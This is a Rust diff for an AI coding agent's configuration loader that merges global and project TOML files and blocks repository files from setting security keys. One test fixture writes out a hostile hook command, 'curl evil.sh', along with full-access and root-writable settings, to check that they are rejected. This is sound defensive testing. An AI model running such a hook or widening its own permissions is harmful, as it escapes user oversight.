@@ -1,12 +1,204 @@
+//! Réglages persistants et configuration déclarative (US-016).
+//!
+//! Deux fichiers, un seul format : le **global** `~/.pyxis/settings.toml`
+//! (contrôlé par l'utilisateur, seul écrit par `/models`, `/effort` et le menu de
+//! permissions) et le **projet** `<workspace>/.pyxis/config.toml` (contrôlé par le
+//! dépôt, donc lu avec méfiance). La lecture passe par le parseur TOML de
+//! référence ; l'écriture reste un upsert de ligne, ce qui préserve les
+//! commentaires du fichier sans faire entrer `toml_edit` dans le graphe.
+//!
+//! Précédence (AC1) : défauts < global < projet < variables d'environnement <
+//! arguments de ligne de commande. Les deux derniers niveaux sont appliqués par
+//! `main.rs`, seul détenteur d'`Args`.
+
 use std::io;
 use std::path::{Path, PathBuf};
 
 use agent_tools::PermissionMode;
 
 const SETTINGS_FILE: &str = "settings.toml";
+const PROJECT_CONFIG_FILE: &str = "config.toml";
 const PERMISSION_MODE_KEY: &str = "permission_mode";
 const REASONING_EFFORT_KEY: &str = "reasoning_effort";
 const MODEL_KEY: &str = "model";
+const WRITABLE_ROOTS_KEY: &str = "writable_roots";
+const HOOKS_KEY: &str = "hooks";
+const TOKEN_BUDGET_KEY: &str = "token_budget";
+const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
+const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
+const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
+const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";
+
+/// Clés reconnues. Une clé absente de cette liste est signalée sans faire
+/// échouer le démarrage (AC5) : un fichier écrit pour une version plus récente
+/// doit rester utilisable.
+const KNOWN_KEYS: &[&str] = &[
+    MODEL_KEY,
+    REASONING_EFFORT_KEY,
+    PERMISSION_MODE_KEY,
+    WRITABLE_ROOTS_KEY,
+    TOKEN_BUDGET_KEY,
+    COST_BUDGET_KEY,
+    INPUT_COST_KEY,
+    OUTPUT_COST_KEY,
+    OVERLOAD_FALLBACK_KEY,
+];
+
+/// Clés qui élargissent un périmètre de sécurité. Un fichier contrôlé par le
+/// workspace ne peut JAMAIS les définir (AC4, FR-07) : c'est exactement le
+/// vecteur de CVE-2026-48124, où une déclaration de hooks venue du dépôt donnait
+/// une exécution hors sandbox. `hooks` figure ici avant d'exister comme
+/// capacité (US-022) : la porte doit être fermée avant d'avoir une serrure.
+const SECURITY_KEYS: &[&str] = &[PERMISSION_MODE_KEY, WRITABLE_ROOTS_KEY, HOOKS_KEY];
+
+/// Configuration effective après fusion des fichiers. Chaque champ optionnel
+/// signifie « non défini » : `main.rs` superpose ensuite l'environnement puis les
+/// arguments, et n'applique un défaut qu'en dernier ressort.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct Config {
+    pub model: Option<String>,
+    pub reasoning_effort: Option<String>,
+    /// Global uniquement (clé de sécurité).
+    pub permission_mode: Option<PermissionMode>,
+    /// Global uniquement (clé de sécurité).
+    pub writable_roots: Vec<PathBuf>,
+    pub token_budget: Option<u64>,
+    pub cost_budget_micro_usd: Option<u64>,
+    pub input_cost_micro_per_ktok: Option<u64>,
+    pub output_cost_micro_per_ktok: Option<u64>,
+    pub overload_fallback_model: Option<String>,
+    /// Diagnostics de chargement : syntaxe, clé inconnue, clé de sécurité
+    /// écartée. Jamais fatals (FR-12) ; l'appelant les écrit sur stderr.
+    pub warnings: Vec<String>,
+}
+
+/// D'où vient un fichier de configuration. Détermine s'il a le droit de toucher
+/// aux clés de sécurité.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Scope {
+    /// `~/.pyxis/settings.toml` — contrôlé par l'utilisateur.
+    Global,
+    /// `<workspace>/.pyxis/config.toml` — contrôlé par le dépôt.
+    Project,
+}
+
+/// Chemin du fichier de configuration de projet. Sous `.pyxis/`, donc déjà
+/// couvert par le refus d'écriture des outils d'édition (US-013) : l'agent ne
+/// peut pas se réécrire sa propre configuration.
+pub fn project_config_path(workspace: &Path) -> PathBuf {
+    workspace.join(".pyxis").join(PROJECT_CONFIG_FILE)
+}
+
+/// Charge et fusionne les deux fichiers. Un fichier absent, illisible ou
+/// syntaxiquement invalide n'empêche jamais le démarrage : la valeur par défaut
+/// s'applique et l'anomalie part dans `warnings` (AC3, FR-12).
+pub fn load(global: Option<&Path>, project: Option<&Path>) -> Config {
+    let mut config = Config::default();
+    for (path, scope) in [(global, Scope::Global), (project, Scope::Project)] {
+        let Some(path) = path else { continue };
+        apply_file(&mut config, path, scope);
+    }
+    config
+}
+
+fn apply_file(config: &mut Config, path: &Path, scope: Scope) {
+    let contents = match std::fs::read_to_string(path) {
+        Ok(contents) => contents,
+        Err(err) if err.kind() == io::ErrorKind::NotFound => return,
+        Err(err) => {
+            config.warnings.push(format!("{}: {err}", path.display()));
+            return;
+        }
+    };
+    let table = match contents.parse::<toml::Table>() {
+        Ok(table) => table,
+        Err(err) => {
+            // AC3 : nommer le fichier, la ligne et la clé. `toml` rapporte déjà
+            // le span et un extrait annoté ; on préfixe par le chemin, et on
+            // aplatit le rendu multi-ligne pour tenir sur une ligne de stderr.
+            let detail = err.to_string().replace('\n', " | ");
+            config
+                .warnings
+                .push(format!("{}: {detail}", path.display()));
+            return;
+        }
+    };
+
+    for (key, value) in &table {
+        let key = key.as_str();
+        if scope == Scope::Project && SECURITY_KEYS.contains(&key) {
+            config.warnings.push(format!(
+                "{}: security key `{key}` ignored (a workspace-controlled file cannot widen a security perimeter)",
+                path.display()
+            ));
+            continue;
+        }
+        if !KNOWN_KEYS.contains(&key) {
+            config
+                .warnings
+                .push(format!("{}: unknown key `{key}`", path.display()));
+            continue;
+        }
+        if let Err(err) = apply_key(config, key, value) {
+            config
+                .warnings
+                .push(format!("{}: {key}: {err}", path.display()));
+        }
+    }
+}
+
+fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<(), String> {
+    match key {
+        MODEL_KEY => config.model = Some(non_empty_string(value)?),
+        REASONING_EFFORT_KEY => config.reasoning_effort = Some(non_empty_string(value)?),
+        PERMISSION_MODE_KEY => {
+            let raw = non_empty_string(value)?;
+            let mode = permission_mode_from_arg(&raw)
+                .ok_or_else(|| format!("unknown permission mode `{raw}`"))?;
+            config.permission_mode = Some(mode);
+        }
+        WRITABLE_ROOTS_KEY => {
+            let array = value
+                .as_array()
+                .ok_or_else(|| "expected an array of paths".to_string())?;
+            let mut roots = Vec::with_capacity(array.len());
+            for entry in array {
+                roots.push(PathBuf::from(non_empty_string(entry)?));
+            }
+            config.writable_roots = roots;
+        }
+        TOKEN_BUDGET_KEY => config.token_budget = Some(positive_u64(value)?),
+        COST_BUDGET_KEY => config.cost_budget_micro_usd = Some(positive_u64(value)?),
+        INPUT_COST_KEY => config.input_cost_micro_per_ktok = Some(positive_u64(value)?),
+        OUTPUT_COST_KEY => config.output_cost_micro_per_ktok = Some(positive_u64(value)?),
+        OVERLOAD_FALLBACK_KEY => config.overload_fallback_model = Some(non_empty_string(value)?),
+        // `KNOWN_KEYS` filtre en amont : ce bras est inatteignable et ne doit
+        // surtout pas paniquer si la liste et ce match divergent un jour.
+        other => return Err(format!("unhandled key `{other}`")),
+    }
+    Ok(())
+}
+
+fn non_empty_string(value: &toml::Value) -> Result<String, String> {
+    let raw = value
+        .as_str()
+        .ok_or_else(|| "expected a string".to_string())?
+        .trim();
+    if raw.is_empty() {
+        return Err("expected a non-empty string".to_string());
+    }
+    Ok(raw.to_string())
+}
+
+fn positive_u64(value: &toml::Value) -> Result<u64, String> {
+    let raw = value
+        .as_integer()
+        .ok_or_else(|| "expected an integer".to_string())?;
+    u64::try_from(raw)
+        .ok()
+        .filter(|value| *value > 0)
+        .ok_or_else(|| "expected an integer > 0".to_string())
+}
 
 pub fn permission_mode_id(mode: PermissionMode) -> &'static str {
     match mode {
@@ -38,18 +230,8 @@ pub fn default_settings_path() -> Option<PathBuf> {
     home_dir().map(|home| home.join(".pyxis").join(SETTINGS_FILE))
 }
 
-pub fn load_permission_mode(path: &Path) -> io::Result<Option<PermissionMode>> {
-    Ok(load_string_key(path, PERMISSION_MODE_KEY)?
-        .as_deref()
-        .and_then(permission_mode_from_arg))
-}
-
 pub fn save_permission_mode(path: &Path, mode: PermissionMode) -> io::Result<()> {
     save_string_key(path, PERMISSION_MODE_KEY, Some(permission_mode_id(mode)))
-}
-
-pub fn load_reasoning_effort(path: &Path) -> io::Result<Option<String>> {
-    Ok(load_string_key(path, REASONING_EFFORT_KEY)?.filter(|value| !value.trim().is_empty()))
 }
 
 pub fn save_reasoning_effort(path: &Path, effort: Option<&str>) -> io::Result<()> {
@@ -58,10 +240,6 @@ pub fn save_reasoning_effort(path: &Path, effort: Option<&str>) -> io::Result<()
         REASONING_EFFORT_KEY,
         effort.map(str::trim).filter(|value| !value.is_empty()),
     )
-}
-
-pub fn load_model(path: &Path) -> io::Result<Option<String>> {
-    Ok(load_string_key(path, MODEL_KEY)?.filter(|value| !value.trim().is_empty()))
 }
 
 pub fn save_model(path: &Path, model: &str) -> io::Result<()> {
@@ -86,22 +264,11 @@ pub fn ensure_file(path: &Path) -> io::Result<()> {
         .map(|_| ())
 }
 
-fn load_string_key(path: &Path, expected_key: &str) -> io::Result<Option<String>> {
-    let contents = match std::fs::read_to_string(path) {
-        Ok(contents) => contents,
-        Err(err) if err.kind() == io::ErrorKind::NotFound => return Ok(None),
-        Err(err) => return Err(err),
-    };
-
-    Ok(contents.lines().find_map(|line| {
-        let (key, value) = line.split_once('=')?;
-        if key.trim() != expected_key {
-            return None;
-        }
-        parse_tomlish_string(value.trim()).map(str::to_string)
-    }))
-}
-
+/// Upsert d'une clé scalaire, ligne à ligne. Volontairement pas `toml_edit` : la
+/// seule chose écrite ici est `key = "value"`, et un remplacement de ligne
+/// préserve les commentaires et l'ordre du fichier de l'utilisateur. Les lignes
+/// de continuation d'un tableau multi-ligne n'ont pas de `=` et sont donc
+/// recopiées telles quelles.
 fn save_string_key(path: &Path, key: &str, value: Option<&str>) -> io::Result<()> {
     let new_line = value.map(|value| format!("{key} = \"{value}\""));
     let mut replaced = false;
@@ -142,18 +309,7 @@ fn is_key_line(line: &str, expected_key: &str) -> bool {
     key.trim() == expected_key
 }
 
-fn parse_tomlish_string(value: &str) -> Option<&str> {
-    if let Some(rest) = value.strip_prefix('"') {
-        return rest.split_once('"').map(|(value, _)| value);
-    }
-    value
-        .split('#')
-        .next()
-        .map(str::trim)
-        .filter(|v| !v.is_empty())
-}
-
-fn home_dir() -> Option<PathBuf> {
+pub fn home_dir() -> Option<PathBuf> {
     std::env::var_os("HOME")
         .or_else(|| std::env::var_os("USERPROFILE"))
         .map(PathBuf::from)
@@ -167,15 +323,33 @@ mod tests {
         std::env::temp_dir().join(format!("pyxis-settings-{}-{tag}.toml", std::process::id()))
     }
 
+    /// Le fichier que `save_*` produit doit rester lisible par le parseur TOML :
+    /// c'est le seul point de contact entre l'upsert de ligne et la lecture.
     #[test]
-    fn load_permission_mode_reads_saved_value() {
-        let path = temp_path("load");
+    fn saved_file_round_trips_through_the_toml_parser() {
+        let path = temp_path("round-trip");
         let _ = std::fs::remove_file(&path);
-        std::fs::write(&path, "permission_mode = \"accept-edits\" # keep\n").unwrap();
+        std::fs::write(
+            &path,
+            "# mes reglages\nwritable_roots = [\n  \"/srv/cache\",\n]\n",
+        )
+        .unwrap();
 
-        let mode = load_permission_mode(&path).unwrap();
+        save_permission_mode(&path, PermissionMode::AcceptEdits).unwrap();
+        save_model(&path, "gpt-5.6-sol").unwrap();
 
-        assert_eq!(mode, Some(PermissionMode::AcceptEdits));
+        let config = load(Some(&path), None);
+
+        assert_eq!(config.permission_mode, Some(PermissionMode::AcceptEdits));
+        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
+        assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/cache")]);
+        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+        assert!(
+            std::fs::read_to_string(&path)
+                .unwrap()
+                .contains("# mes reglages"),
+            "l'upsert doit preserver les commentaires"
+        );
         let _ = std::fs::remove_file(path);
     }
 
@@ -205,18 +379,6 @@ mod tests {
             std::fs::read_to_string(&path).unwrap(),
             "model = \"gpt\"\npermission_mode = \"full-access\"\n"
         );
-        let _ = std::fs::remove_file(path);
-    }
-
-    #[test]
-    fn load_reasoning_effort_reads_saved_value() {
-        let path = temp_path("effort-load");
-        let _ = std::fs::remove_file(&path);
-        std::fs::write(&path, "reasoning_effort = \"high\" # keep\n").unwrap();
-
-        let effort = load_reasoning_effort(&path).unwrap();
-
-        assert_eq!(effort.as_deref(), Some("high"));
         let _ = std::fs::remove_file(path);
     }
 
@@ -261,11 +423,9 @@ mod tests {
 
         save_model(&path, "gpt-5.6-sol").unwrap();
 
-        assert_eq!(load_model(&path).unwrap().as_deref(), Some("gpt-5.6-sol"));
-        assert_eq!(
-            load_reasoning_effort(&path).unwrap().as_deref(),
-            Some("xhigh")
-        );
+        let config = load(Some(&path), None);
+        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
+        assert_eq!(config.reasoning_effort.as_deref(), Some("xhigh"));
         let _ = std::fs::remove_file(path);
     }
 
@@ -281,7 +441,7 @@ mod tests {
 
         save_model(&path, "gpt-5.5").unwrap();
         ensure_file(&path).unwrap();
-        assert_eq!(load_model(&path).unwrap().as_deref(), Some("gpt-5.5"));
+        assert_eq!(load(Some(&path), None).model.as_deref(), Some("gpt-5.5"));
         let _ = std::fs::remove_file(path);
     }
 
@@ -302,5 +462,209 @@ mod tests {
             "permission_mode = \"ask\"\n"
         );
         let _ = std::fs::remove_file(path);
+    }
+
+    // ─────────────────────────── US-016 : configuration ───────────────────────────
+
+    /// Deux fichiers dans un répertoire jetable, pour éprouver la fusion.
+    struct ConfigDir {
+        dir: PathBuf,
+    }
+
+    impl ConfigDir {
+        fn new(tag: &str) -> Self {
+            static COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
+            let n = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+            let dir =
+                std::env::temp_dir().join(format!("pyxis-config-{}-{tag}-{n}", std::process::id()));
+            let _ = std::fs::remove_dir_all(&dir);
+            std::fs::create_dir_all(&dir).unwrap();
+            Self { dir }
+        }
+
+        fn write(&self, name: &str, contents: &str) -> PathBuf {
+            let path = self.dir.join(name);
+            std::fs::write(&path, contents).unwrap();
+            path
+        }
+    }
+
+    impl Drop for ConfigDir {
+        fn drop(&mut self) {
+            let _ = std::fs::remove_dir_all(&self.dir);
+        }
+    }
+
+    /// AC1 : le projet écrase le global sur les clés qu'il a le droit de porter.
+    /// Les deux niveaux suivants (env, CLI) sont appliqués par `main.rs`, prouvés
+    /// par `run_config_reads_*` là-bas.
+    #[test]
+    fn project_overrides_global_for_non_security_keys() {
+        let dir = ConfigDir::new("precedence");
+        let global = dir.write(
+            "settings.toml",
+            "model = \"global-model\"\nreasoning_effort = \"low\"\ntoken_budget = 111\n",
+        );
+        let project = dir.write(
+            "config.toml",
+            "model = \"project-model\"\ntoken_budget = 222\n",
+        );
+
+        let config = load(Some(&global), Some(&project));
+
+        assert_eq!(config.model.as_deref(), Some("project-model"));
+        assert_eq!(config.token_budget, Some(222));
+        // Non redéfini par le projet → la valeur globale survit.
+        assert_eq!(config.reasoning_effort.as_deref(), Some("low"));
+        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+    }
+
+    /// AC4 / FR-07 : un dépôt cloné ne doit pas pouvoir élargir le périmètre de
+    /// sécurité. `hooks` est refusé avant même d'exister comme capacité.
+    #[test]
+    fn project_security_keys_are_ignored_with_a_warning() {
+        let dir = ConfigDir::new("security");
+        let global = dir.write(
+            "settings.toml",
+            "permission_mode = \"ask\"\nwritable_roots = [\"/srv/global\"]\n",
+        );
+        let project = dir.write(
+            "config.toml",
+            "permission_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\n",
+        );
+
+        let config = load(Some(&global), Some(&project));
+
+        assert_eq!(config.permission_mode, Some(PermissionMode::Default));
+        assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/global")]);
+        for key in SECURITY_KEYS {
+            assert!(
+                config
+                    .warnings
+                    .iter()
+                    .any(|w| w.contains(&format!("security key `{key}`"))),
+                "clé {key} non signalée: {:?}",
+                config.warnings
+            );
+        }
+    }
+
+    /// AC4 : le global, lui, a le droit de les porter.
+    #[test]
+    fn global_may_set_security_keys() {
+        let dir = ConfigDir::new("global-security");
+        let global = dir.write(
+            "settings.toml",
+            "permission_mode = \"full-access\"\nwritable_roots = [\"/srv/cache\", \"/opt/scratch\"]\n",
+        );
+
+        let config = load(Some(&global), None);
+
+        assert_eq!(
+            config.permission_mode,
+            Some(PermissionMode::BypassPermissions)
+        );
+        assert_eq!(
+            config.writable_roots,
+            vec![PathBuf::from("/srv/cache"), PathBuf::from("/opt/scratch")]
+        );
+        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
+    }
+
+    /// AC3 : syntaxe invalide → défauts + erreur localisée, jamais d'échec.
+    #[test]
+    fn invalid_toml_falls_back_to_defaults_and_names_file_and_line() {
+        let dir = ConfigDir::new("invalid");
+        let global = dir.write("settings.toml", "model = \"ok\"\nreasoning_effort = high\n");
+
+        let config = load(Some(&global), None);
+
+        // Le fichier entier est écarté : un TOML invalide n'a pas de « moitié
+        // valide » sur laquelle il serait honnête de s'appuyer.
+        assert_eq!(
+            config,
+            Config {
+                warnings: config.warnings.clone(),
+                ..Config::default()
+            }
+        );
+        let warning = config.warnings.join(" ");
+        assert!(warning.contains("settings.toml"), "{warning}");
+        assert!(warning.contains("2"), "la ligne fautive manque: {warning}");
+    }
+
+    /// AC5 : clé inconnue signalée, démarrage préservé, reste du fichier appliqué.
+    #[test]
+    fn unknown_key_is_reported_without_dropping_the_rest() {
+        let dir = ConfigDir::new("unknown");
+        let global = dir.write("settings.toml", "model = \"kept\"\nfuture_key = 3\n");
+
+        let config = load(Some(&global), None);
+
+        assert_eq!(config.model.as_deref(), Some("kept"));
+        assert_eq!(config.warnings.len(), 1, "{:?}", config.warnings);
+        assert!(
+            config.warnings[0].contains("unknown key `future_key`"),
+            "{:?}",
+            config.warnings
+        );
+    }
+
+    /// Une valeur du bon nom mais du mauvais type est signalée par clé, et ne
+    /// contamine pas les autres.
+    #[test]
+    fn wrong_typed_value_is_reported_per_key() {
+        let dir = ConfigDir::new("types");
+        let global = dir.write(
+            "settings.toml",
+            "model = 42\ntoken_budget = 0\nwritable_roots = \"/srv/cache\"\nreasoning_effort = \"high\"\n",
+        );
+
+        let config = load(Some(&global), None);
+
+        assert_eq!(config.reasoning_effort.as_deref(), Some("high"));
+        assert!(config.model.is_none());
+        assert!(config.token_budget.is_none());
+        assert!(config.writable_roots.is_empty());
+        assert_eq!(config.warnings.len(), 3, "{:?}", config.warnings);
+    }
+
+    /// Aucun fichier : pas de bruit, pas d'échec.
+    #[test]
+    fn absent_files_produce_no_warning() {
+        let dir = ConfigDir::new("absent");
+        let config = load(
+            Some(&dir.dir.join("settings.toml")),
+            Some(&dir.dir.join("config.toml")),
+        );
+
+        assert_eq!(config, Config::default());
+    }
+
+    /// Une permission inconnue ne dégrade pas silencieusement vers un mode plus
+    /// permissif : elle est écartée, et le défaut fail-closed s'applique.
+    #[test]
+    fn unknown_permission_mode_is_rejected() {
+        let dir = ConfigDir::new("perm");
+        let global = dir.write("settings.toml", "permission_mode = \"yolo\"\n");
+
+        let config = load(Some(&global), None);
+
+        assert!(config.permission_mode.is_none());
+        assert!(
+            config.warnings[0].contains("unknown permission mode `yolo`"),
+            "{:?}",
+            config.warnings
+        );
+    }
+
+    #[test]
+    fn project_config_path_sits_inside_the_protected_pyxis_directory() {
+        let path = project_config_path(Path::new("/ws"));
+        assert_eq!(path, PathBuf::from("/ws/.pyxis/config.toml"));
+        assert!(
+            agent_tools::path::PROTECTED_SUBPATHS.contains(&".pyxis"),
+            "le fichier de configuration de projet doit rester non écrivable par les outils"
+        );
     }
 }
